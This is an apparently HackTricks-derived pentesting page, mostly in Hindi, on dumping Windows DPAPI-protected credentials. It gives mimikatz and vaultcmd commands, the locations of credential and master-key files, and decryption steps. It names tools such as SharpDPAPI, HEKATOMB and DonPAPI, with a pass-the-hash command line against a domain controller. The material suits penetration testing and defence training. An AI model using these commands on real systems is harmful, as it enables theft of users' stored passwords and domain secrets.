# DPAPI - Extracting Passwords

{{#include ../../banners/hacktricks-training.md}}



## What is DPAPI

Data Protection API (DPAPI) मुख्य रूप से Windows ऑपरेटिंग सिस्टम के भीतर **असामान्य निजी कुंजियों के सममित एन्क्रिप्शन** के लिए उपयोग किया जाता है, जो उपयोगकर्ता या सिस्टम रहस्यों को महत्वपूर्ण एंट्रॉपी के स्रोत के रूप में उपयोग करता है। यह दृष्टिकोण डेवलपर्स के लिए एन्क्रिप्शन को सरल बनाता है, जिससे वे उपयोगकर्ता के लॉगिन रहस्यों से निकाली गई कुंजी का उपयोग करके डेटा को एन्क्रिप्ट कर सकते हैं या, सिस्टम एन्क्रिप्शन के लिए, सिस्टम के डोमेन प्रमाणीकरण रहस्यों का उपयोग कर सकते हैं, इस प्रकार डेवलपर्स को एन्क्रिप्शन कुंजी की सुरक्षा प्रबंधित करने की आवश्यकता से मुक्त कर देता है।

### Protected Data by DPAPI

DPAPI द्वारा संरक्षित व्यक्तिगत डेटा में शामिल हैं:

- Internet Explorer और Google Chrome के पासवर्ड और ऑटो-कंप्लीशन डेटा
- Outlook और Windows Mail जैसे अनुप्रयोगों के लिए ई-मेल और आंतरिक FTP खाता पासवर्ड
- साझा फ़ोल्डरों, संसाधनों, वायरलेस नेटवर्क और Windows Vault के लिए पासवर्ड, जिसमें एन्क्रिप्शन कुंजियाँ शामिल हैं
- दूरस्थ डेस्कटॉप कनेक्शनों, .NET पासपोर्ट, और विभिन्न एन्क्रिप्शन और प्रमाणीकरण उद्देश्यों के लिए निजी कुंजियों के लिए पासवर्ड
- Credential Manager द्वारा प्रबंधित नेटवर्क पासवर्ड और CryptProtectData का उपयोग करने वाले अनुप्रयोगों में व्यक्तिगत डेटा, जैसे Skype, MSN messenger, और अधिक

## List Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Credential Files

The **credentials files protected** could be located in:
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
mimikatz `dpapi::cred` का उपयोग करके क्रेडेंशियल्स जानकारी प्राप्त करें, प्रतिक्रिया में आपको एन्क्रिप्टेड डेटा और guidMasterKey जैसी दिलचस्प जानकारी मिल सकती है।
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
आप **mimikatz module** `dpapi::cred` का उपयोग उचित `/masterkey` के साथ डिक्रिप्ट करने के लिए कर सकते हैं:
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## मास्टर कुंजी

DPAPI कुंजी जो उपयोगकर्ता की RSA कुंजियों को एन्क्रिप्ट करने के लिए उपयोग की जाती है, `%APPDATA%\Microsoft\Protect\{SID}` निर्देशिका के तहत संग्रहीत होती है, जहाँ {SID} उस उपयोगकर्ता का [**सुरक्षा पहचानकर्ता**](https://en.wikipedia.org/wiki/Security_Identifier) है। **DPAPI कुंजी उसी फ़ाइल में संग्रहीत होती है जिसमें उपयोगकर्ताओं की निजी कुंजियों की सुरक्षा करने वाली मास्टर कुंजी होती है**। यह आमतौर पर 64 बाइट्स का यादृच्छिक डेटा होता है। (ध्यान दें कि यह निर्देशिका सुरक्षित है इसलिए आप इसे `dir` का उपयोग करके cmd से सूचीबद्ध नहीं कर सकते, लेकिन आप इसे PS से सूचीबद्ध कर सकते हैं)।
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
यह एक उपयोगकर्ता के मास्टर कुंजियों का समूह कैसा दिखेगा:

![](<../../images/image (1121).png>)

आमतौर पर **प्रत्येक मास्टर कुंजी एक एन्क्रिप्टेड सममित कुंजी होती है जो अन्य सामग्री को डिक्रिप्ट कर सकती है**। इसलिए, **एन्क्रिप्टेड मास्टर कुंजी को निकालना** दिलचस्प है ताकि बाद में उस **अन्य सामग्री** को **डिक्रिप्ट** किया जा सके जो इसके साथ एन्क्रिप्ट की गई है।

### मास्टर कुंजी निकालें और डिक्रिप्ट करें

मास्टर कुंजी निकालने और इसे डिक्रिप्ट करने के उदाहरण के लिए पोस्ट देखें [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin)।

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) कुछ DPAPI कार्यक्षमता का C# पोर्ट है [@gentilkiwi](https://twitter.com/gentilkiwi) के [Mimikatz](https://github.com/gentilkiwi/mimikatz/) प्रोजेक्ट से।

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) एक उपकरण है जो LDAP निर्देशिका से सभी उपयोगकर्ताओं और कंप्यूटरों को निकालने और RPC के माध्यम से डोमेन नियंत्रक बैकअप कुंजी निकालने को स्वचालित करता है। स्क्रिप्ट फिर सभी कंप्यूटरों के आईपी पते को हल करेगी और सभी कंप्यूटरों पर smbclient प्रदर्शन करेगी ताकि सभी उपयोगकर्ताओं के सभी DPAPI ब्लॉब्स को पुनः प्राप्त किया जा सके और सभी को डोमेन बैकअप कुंजी के साथ डिक्रिप्ट किया जा सके।

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP से निकाले गए कंप्यूटरों की सूची के साथ आप हर उप नेटवर्क को ढूंढ सकते हैं भले ही आप उन्हें नहीं जानते हों!

"क्योंकि डोमेन एडमिन अधिकार पर्याप्त नहीं हैं। सभी को हैक करें।"

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) स्वचालित रूप से DPAPI द्वारा संरक्षित रहस्यों को डंप कर सकता है।

## संदर्भ

- [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

{{#include ../../banners/hacktricks-training.md}}
